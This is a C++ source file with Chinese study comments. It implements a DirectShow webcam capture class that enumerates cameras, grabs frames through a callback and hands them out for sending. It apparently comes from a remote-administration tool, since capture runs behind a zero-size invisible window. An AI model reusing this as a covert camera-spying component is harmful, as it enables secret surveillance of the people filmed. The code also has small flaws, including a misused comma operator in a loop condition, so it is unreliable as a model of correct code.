//-------------------------------------------------------------------
// CCaptureVideo视频捕捉类实现文件CaptureVideo.cpp
//-------------------------------------------------------------------
// CaptureVideo.cpp: implementation of the CCaptureVideo class.
//
/////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
//#include "Manager.h"
#include "CaptureVideo.h"
#include "VideoCap.h"
#include "VideoCodec.h"
#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif
#undef strcpy
//他的定义在这里也是一个全局变量  搜索一下mCB
CSampleGrabberCB mCB;  //////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
CCaptureVideo::CCaptureVideo()
{
	//COM Library Intialization
	if(FAILED(CoInitialize(NULL))) /*, COINIT_APARTMENTTHREADED)))*/
	{
		//    AfxMessageBox("CCaptureVideo CoInitialize Failed!\r\n"); 
		return;
	}
	m_hWnd = NULL;
	m_pVW = NULL;
	m_pMC = NULL;
	m_pGB = NULL;
	m_pBF = NULL; 
	m_pGrabber = NULL; 
	m_pCapture = NULL; 
}
CCaptureVideo::~CCaptureVideo()
{
	// Stop media playback
	// Stop media playback
	if(m_pMC)m_pMC->StopWhenReady();
	if(m_pVW){
		m_pVW->put_Visible(OAFALSE);
		m_pVW->put_Owner(NULL);
	}
	SAFE_RELEASE(m_pMC);
	SAFE_RELEASE(m_pVW); 
	SAFE_RELEASE(m_pGB);
	SAFE_RELEASE(m_pBF);
	SAFE_RELEASE(m_pGrabber); 
//	SAFE_RELEASE(m_pCapture);
	CoUninitialize() ; 
}

int CCaptureVideo::EnumDevices(BYTE* buf)
{
	int id = 0;//枚举视频扑捉设备
	   //ICreateDevEnum接口建立指定类型的列表
	ICreateDevEnum *pCreateDevEnum;
	   //用指定的类标识符创建一个未初始化的对象,这里的参数为CLSID_SystemDeviceEnum即枚举设备的对象
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,IID_ICreateDevEnum, (void**)&pCreateDevEnum);if (hr != NOERROR)return -1;
	CComPtr<IEnumMoniker> pEm;
	   //指出要枚举那个类型的设备这里参数CLSID_VideoInputDeviceCategory枚举视频设备
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory,&pEm, 0);
	   if (hr != NOERROR)return -1;
	   pEm->Reset();
	   ULONG cFetched;
       IMoniker *pM;
	   int count=0;           //记录数组的个数
	   while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK) {
		   IPropertyBag *pBag;
		   //此绑定到该对象的存储
		   hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		   if(SUCCEEDED(hr)) {
			   VARIANT var;
			   var.vt = VT_BSTR;
			   hr = pBag->Read(L"FriendlyName", &var, NULL);  //读取设备名
			   if (hr == NOERROR) {
				   TCHAR str[2048]; 
				   id++;
				   WideCharToMultiByte(CP_ACP,0,var.bstrVal, -1, str, 2048, NULL, NULL);
				   //::SendMessage(hList, CB_ADDSTRING, 0,(LPARAM)str);
				   //将得到的设备名存储起来
				   memcpy(buf+(count++)*512,str,strlen(str));
				   SysFreeString(var.bstrVal);
			   }
			   pBag->Release();
		   }
		   pM->Release();
	   }
	   return id;
	   
				   //oninitdialog分析过了，就是获取视频设备名，然后我们点击HaveLook就能显示视频的数据，我们去看一看
}
HRESULT CCaptureVideo::Close() 
{
	// Stop media playback
	if(m_pMC)m_pMC->StopWhenReady();
	if(m_pVW){
		m_pVW->put_Visible(OAFALSE);
		m_pVW->put_Owner(NULL);
	 }
	SAFE_RELEASE(m_pMC);
	SAFE_RELEASE(m_pVW); 
	SAFE_RELEASE(m_pGB);
	SAFE_RELEASE(m_pBF);
	SAFE_RELEASE(m_pGrabber); 
	SAFE_RELEASE(m_pCapture);
	return S_OK ; 
}
HRESULT CCaptureVideo::Open(int iDeviceID,int iPress)
{
	HRESULT hr;
	hr = InitCaptureGraphBuilder();
	if (FAILED(hr)){
		return hr;
	}
	// Bind Device Filter. We know the device because the id was passed in
	if(!BindVideoFilter(iDeviceID, &m_pBF))
		return S_FALSE;
	
	hr = m_pGB->AddFilter(m_pBF, L"Capture Filter");
	
	// create a sample grabber
	hr = CoCreateInstance( CLSID_SampleGrabber, NULL, CLSCTX_INPROC_SERVER, IID_ISampleGrabber, (void**)&m_pGrabber );
	if(FAILED(hr)){
		return hr;
	   }
	CComQIPtr< IBaseFilter, &IID_IBaseFilter > pGrabBase( m_pGrabber );//设置视频格式
	AM_MEDIA_TYPE mt; 
	ZeroMemory(&mt, sizeof(AM_MEDIA_TYPE));
	mt.majortype = MEDIATYPE_Video;
	mt.subtype = MEDIASUBTYPE_RGB24; // MEDIASUBTYPE_RGB24 ; 
	hr = m_pGrabber->SetMediaType(&mt);
			 if( FAILED( hr ) ){
				 return hr;
			 }
			 hr = m_pGB->AddFilter( pGrabBase, L"Grabber" );
             if( FAILED( hr ) ){
				 return hr;
			 }// try to render preview/capture pin
			 hr = m_pCapture->RenderStream(&PIN_CATEGORY_PREVIEW, &MEDIATYPE_Video,m_pBF,pGrabBase,NULL);
			 if( FAILED( hr ) )
				 hr = m_pCapture->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video,m_pBF,pGrabBase,NULL);    
			 if( FAILED( hr ) ){
				 return hr;
			 }
			 hr = m_pGrabber->GetConnectedMediaType( &mt );
			 if ( FAILED( hr) ){
				 return hr;
			 }VIDEOINFOHEADER * vih = (VIDEOINFOHEADER*) mt.pbFormat;
			 mCB.lWidth = vih->bmiHeader.biWidth;
			 mCB.lHeight = vih->bmiHeader.biHeight;
			 mCB.bGrabVideo = FALSE ; 
			 //mCB.frame_handler = NULL ; 
			 FreeMediaType(mt);
			 hr = m_pGrabber->SetBufferSamples( FALSE );
			 hr = m_pGrabber->SetOneShot( FALSE );
			 //设置视频捕获回调函数 也就是如果有视频数据时就会调用这个类的BufferCB函数
			 //返回OnTimer
			 hr = m_pGrabber->SetCallback( &mCB, 1 ); 
			 //设置视频捕捉窗口
			 m_hWnd = CreateWindow("#32770", /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
			 SetupVideoWindow();
			 hr = m_pMC->Run();//开始视频捕捉
			 if(FAILED(hr)){
				 //AfxMessageBox("Couldn’t run the graph!");return hr;
			 }
			 return S_OK;
}

// bind the Video Filter
bool CCaptureVideo::BindVideoFilter(int deviceId, IBaseFilter **pFilter)
{
	if (deviceId < 0)
		return false;// enumerate all video capture devices
	CComPtr<ICreateDevEnum> pCreateDevEnum;
	HRESULT hr = CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER,
		IID_ICreateDevEnum, (void**)&pCreateDevEnum);
	if (hr != NOERROR)
	   {
		return false;
	   }
	CComPtr<IEnumMoniker> pEm;
	hr = pCreateDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory,&pEm, 0);
	if (hr != NOERROR) 
	   {
		return false;
	   }
	pEm->Reset();
	ULONG cFetched;
	IMoniker *pM;
	int index = 0;
	while(hr = pEm->Next(1, &pM, &cFetched), hr==S_OK, index <= deviceId)
	{
		IPropertyBag *pBag;
		hr = pM->BindToStorage(0, 0, IID_IPropertyBag, (void **)&pBag);
		if(SUCCEEDED(hr)) 
		{
			VARIANT var;
			var.vt = VT_BSTR;
			hr = pBag->Read(L"FriendlyName", &var, NULL);
			if (hr == NOERROR) 
			{
				if (index == deviceId)
				{
					pM->BindToObject(0, 0, IID_IBaseFilter, (void**)pFilter);
				}
				SysFreeString(var.bstrVal);
			}
			pBag->Release();
		}
		pM->Release();
		index++;
	}
	return true;
}
HRESULT CCaptureVideo::InitCaptureGraphBuilder()
{
	HRESULT hr;// 创建IGraphBuilder接口
	hr=CoCreateInstance(CLSID_FilterGraph, NULL, CLSCTX_INPROC_SERVER, IID_IGraphBuilder, (void **)&m_pGB);
	// 创建ICaptureGraphBuilder2接口
	hr = CoCreateInstance (CLSID_CaptureGraphBuilder2 , NULL, CLSCTX_INPROC,
		IID_ICaptureGraphBuilder2, (void **) &m_pCapture);
	if (FAILED(hr))return hr;
	m_pCapture->SetFiltergraph(m_pGB);
	hr = m_pGB->QueryInterface(IID_IMediaControl, (void **)&m_pMC);
	if (FAILED(hr))return hr;
	hr = m_pGB->QueryInterface(IID_IVideoWindow, (LPVOID *) &m_pVW);
	if (FAILED(hr))return hr;
	return hr;
}
HRESULT CCaptureVideo::SetupVideoWindow()
{
    HRESULT hr;
    hr = m_pVW->put_Owner((OAHWND)m_hWnd);
	if (FAILED(hr))return hr;
	hr = m_pVW->put_WindowStyle(WS_CHILD | WS_CLIPCHILDREN);
	if (FAILED(hr))return hr;
	ResizeVideoWindow();
	hr = m_pVW->put_Visible(OATRUE);
	return hr;
}
void CCaptureVideo::ResizeVideoWindow()
{
    if (m_pVW){
		//让图像充满整个窗口
		RECT rc;
		::GetClientRect(m_hWnd,&rc);
        m_pVW->SetWindowPosition(0, 0, rc.right, rc.bottom);
	} 
}
void CCaptureVideo::FreeMediaType(AM_MEDIA_TYPE& mt)
{
    if (mt.cbFormat != 0) {
		CoTaskMemFree((PVOID)mt.pbFormat);
		// Strictly unnecessary but tidier
		mt.cbFormat = 0;
		mt.pbFormat = NULL;
	}
	if (mt.pUnk != NULL) {
		mt.pUnk->Release();
		mt.pUnk = NULL;
	}
}

void CCaptureVideo::Init()
{
   	m_hWnd = CreateWindow("#32770", /* Dialog */ "", WS_POPUP, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
	HRESULT hr;
	hr = InitCaptureGraphBuilder();
	if (FAILED(hr))
	{
		//AfxMessageBox("Failed to get video interfaces!");
		return ;
	}
	SetupVideoWindow();
}

LPBITMAPINFO CCaptureVideo::GetBmpInfo()
{
	//SetEvent(mCB.Sendstate);           //设置发送结束 可以得到数据
	return mCB.GetBmpInfo();
}

LPBYTE CCaptureVideo::GetDIB(DWORD& nSize)
{
	BYTE *buf=NULL;
    do 
    {
		if (mCB.bStact==CMD_CAN_SEND)      //这里改变了一下发送的状态
		{
			buf=mCB.GetNextScreen(nSize);     //通过另外一个类的成员函数得到视频数据，我们继续跟进
		}
    } while (buf==NULL);

	
    return buf;
}

DWORD CCaptureVideo::GetBufferSize()
{
	return mCB.bufSize;
}

void  CCaptureVideo::SendEnd()            //发送结束  设置可以再取数据
{
	InterlockedExchange((LPLONG)&mCB.bStact,CMD_CAN_COPY);      //原子自增可以发送        //原子自减  发送完毕 可以copy 
}
//查找引脚
IPin* CCaptureVideo::FindPin(IBaseFilter *pFilter, PIN_DIRECTION dir)
{
	IEnumPins* pEnumPins;
	IPin* pOutpin;
	PIN_DIRECTION pDir;
	pFilter->EnumPins(&pEnumPins);
	
	while (pEnumPins->Next(1,&pOutpin,NULL)==S_OK)
	{
		pOutpin->QueryDirection(&pDir);
		if (pDir==dir)
		{
			return pOutpin;
		}
	}
	return 0;
}



BYTE* CCaptureVideo::EnumCompress()
{
	CVideoCodec cVideo; 
	int	fccHandler;
    char strName[MAX_PATH];
	LPBYTE lpBuffer=NULL;
	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
    int iCount=0;//共有多上个压缩设备
	
	while(cVideo.MyEnumCodecs(&fccHandler, strName))
	{
		iCount++;
		DWORD 	dwOffset = LocalSize(lpBuffer);
		int iMsgSize=strlen(strName)+sizeof(DWORD)+1;    //一个表达压缩设备所用的大小
		//开辟新的内存储存数据
		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset +iMsgSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		memcpy(lpBuffer+dwOffset,&fccHandler,sizeof(DWORD));     //压缩的编码
		strcpy((char*)(lpBuffer+dwOffset+sizeof(DWORD)),strName);
	}
	lpBuffer[0]=iCount;
	return lpBuffer;
}
